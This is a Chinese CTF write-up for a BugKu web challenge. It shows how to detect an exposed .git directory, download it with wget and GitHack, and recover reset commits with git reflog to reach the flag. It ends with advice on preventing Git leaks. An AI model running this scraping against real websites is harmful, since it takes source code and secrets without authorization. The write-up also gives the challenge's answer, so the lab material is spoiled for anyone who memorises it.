# BugKu Web7 - source

## 题目信息
- **平台**: [BugKu CTF](https://ctf.bugku.com/)
- **类型**: Web
- **难度**: ⭐⭐
- **金币**: 3
- **分数**: 20
- **题目地址**: http://160.202.254.160:17030/

## 题目描述
打开题目后，页面显示简单的 HTML 内容，提示"查看源代码"

## 解题过程

### 1. 查看页面源码
按 `Ctrl + U` 或 `F12` 查看页面源代码，发现：

```html
<html>
<head>
<body>
<p>Hello,world!</p>
<p>This is my friend :<!--tig--></p>   <!-- tig 是 git 的反向 -->
<!--flag{Zmxhz19ub3RfaGvyzSEHIQ==}-->  <!-- 假的 flag，干扰信息 -->
</body>
</head>
</html>
```

**关键发现**：
- `<!--tig-->`：`tig` 是 `git` 的反向拼写，暗示 Git 相关
- 注释中的 `flag{Zmxhz19ub3RfaGvyzSEHIQ==}` 是假的 flag，解码后为 `flag{not_here}`

### 2. 探测 Git 源码泄露
根据 `tig` 提示，尝试访问 `.git` 目录：

```
http://160.202.254.160:17030/.git/
```

返回目录列表，确认存在 **Git 源码泄露**：

```
Index of /.git
COMMIT_EDITMSG
HEAD
ORIG_HEAD
branches/
config
description
hooks/
index
info/
logs/
objects/
refs/
```

### 3. 恢复 Git 仓库
**方法一：使用 wget 下载 .git 目录**
```bash
# 1. 进入桌面
cd ~/Desktop

# 2.创建目录并进入
mkdir bugku_source && cd bugku_source

# 3. 用 wget 下载整个 .git 目录
wget -r -np -nH --cut-dirs=0 -R "index.html*" http://160.202.254.160:17030/.git/ 

# 4. 恢复 Git 仓库文件
git checkout .
# 输出: Updated 2 paths from the index
```
**参数说明：**
| 参数                 | 作用               |
| :----------------- | :--------------- |
| `-r`               | 递归下载             |
| `-np`              | 不向上级目录下载         |
| `-nH`              | 不创建主机名目录         |
| `--cut-dirs=0`     | 不忽略目录层级          |
| `-R "index.html*"` | 排除 index.html 文件 |



**方法二：使用 GitHack 工具**
```bash
# 下载 GitHack
git clone https://github.com/lijiejie/GitHack.git

# 进入目录并运行
cd GitHack
python GitHack.py http://160.202.254.160:17030/.git/
```
**查看恢复的文件：**
```bash
cd 160.202.254.160:17030
ls
# 输出：flag.txt  index.html

cat flag.txt
# 输出：flag{not_here}  （假的 flag）

cat index.html
```
**进入GitHack 生成的目录:**
```bash
# 1. 回到桌面
cd ~/Desktop

# 2. 查找 GitHack 生成的目录
ls -la

# 输出:
# total 16
# drwxr-xr-x  4 kali kali 4096 Jun  7 08:40 .
# drwx------ 15 kali kali 4096 Jun  7 08:45 ..
# drwxrwxr-x  8 kali kali 4096 Jun  7 07:06 .git
# drwxrwxr-x  5 kali kali 4096 Jun  7 08:41 GitHack

# 3.进入.git目录
cd .git

# 4.查看所有 commit
git log --all --oneline
# 输出：
# d256328 (HEAD -> master) flag is here?
# e0b8e8e this is index.html

# 5.查看某个具体 commit 的内容
git show d256328
# 输出：       
# commit d256328b55ccd8c985237e870a16a3e840f2aa2a (HEAD -> master)
# Author: vFREE <flag@flag.com>
# Date:   Sun Jan 17 20:30:53 2021 +0800
```

### 4. 分析 Git 历史记录

**查看 reflog（所有操作记录）**：
```bash
git reflog
```

**输出**：
```
d256328 (HEAD -> master) HEAD@{0}: reset: moving to d25632
13ce8d0 HEAD@{1}: commit: flag is here?          ← 被 reset 掉的 commit
fdce35e HEAD@{2}: reset: moving to fdce35e
e0b8e8e HEAD@{3}: reset: moving to e0b8e
40c6d51 HEAD@{4}: commit: flag is here?          ← 被 reset 掉的 commit
fdce35e HEAD@{5}: commit: flag is here?
d256328 (HEAD -> master) HEAD@{6}: commit: flag is here?
e0b8e8e HEAD@{7}: commit (initial): this is index.html
```

**发现**：有多个 `flag is here?` 的 commit 被 `reset` 操作隐藏了！

### 5. 查看被隐藏的 commit

**查看 13ce8d0**：
```bash
git show 13ce8d0
```

**输出**：
```
commit 13ce8d0d982aee1efdbc42cbae0acdaaf29d5aa1
Author: vFREE <flag@flag.com>
Date:   Sun Jan 17 20:36:41 2021 +0800

    flag is here?

diff --git a/flag.txt b/flag.txt
index aa6f6dc..023ba4a 100644
--- a/flag.txt
+++ b/flag.txt
@@ -1 +1 @@
-flag{nonono}
+flag{hahahahahhahahahahnotflag}
```

**查看 40c6d51**：
```bash
git show 40c6d51
```

**输出**：
```
commit 40c6d51b81775a1590c1b051d9562222e41c4741
Author: vFREE <flag@flag.com>
Date:   Sun Jan 17 20:34:43 2021 +0800

    flag is here?

diff --git a/flag.txt b/flag.txt
index aa6f6dc..726e5d1 100644
--- a/flag.txt
+++ b/flag.txt
@@ -1 +1 @@
-flag{nonono}
+flag{git_is_good_distributed_version_control_system}
```

**找到真正的 flag！**

### 6. 其他尝试过的命令

**查看 stash（暂存区）**：
```bash
git stash list
# 输出：（空）

git stash show -p
# 输出：No stash entries found.
```

**查看分支**：
```bash
git branch -a
# 输出：
# * master
#   remotes/origin/HEAD -> origin/master
#   remotes/origin/master
```

**查找系统中的 flag.txt**：
```bash
find ~/Desktop -name "flag.txt"
# 输出：
# /home/kali/Desktop/flag.txt
# /home/kali/Desktop/GitHack/160.202.254.160_17030/flag.txt
```

## Flag
```
flag{git_is_good_distributed_version_control_system}
```

## 涉及知识点

### Git 源码泄露
- **原因**：网站部署时 `.git` 目录未正确保护，被 Web 服务器暴露
- **危害**：攻击者可下载完整 Git 仓库，获取源代码、历史版本、敏感信息
- **防御**：部署时删除 `.git` 目录，或配置 Web 服务器禁止访问

### Git 常用命令
| 命令 | 作用 |
|:---|:---|
| `git reflog` | 查看所有操作记录（包括被删除的 commit） |
| `git log --all --oneline` | 查看所有分支的 commit 历史 |
| `git show <commit_id>` | 查看某个 commit 的详细内容 |
| `git stash list` | 查看暂存区列表 |
| `git branch -a` | 查看所有分支 |
| `git checkout <commit_id>` | 切换到某个 commit |

### GitHack 工具
- **作用**：通过泄露的 `.git` 目录恢复网站源码
- **原理**：下载 `.git/index` 文件，解析其中的文件列表和 SHA1，然后下载对应的 objects
- **GitHub**：https://github.com/lijiejie/GitHack

## 参考
- [GitHack 工具](https://github.com/lijiejie/GitHack)
- [Git reflog 文档](https://git-scm.com/docs/git-reflog)
- [Git 源码泄露漏洞](https://www.freebuf.com/articles/web/213313.html)
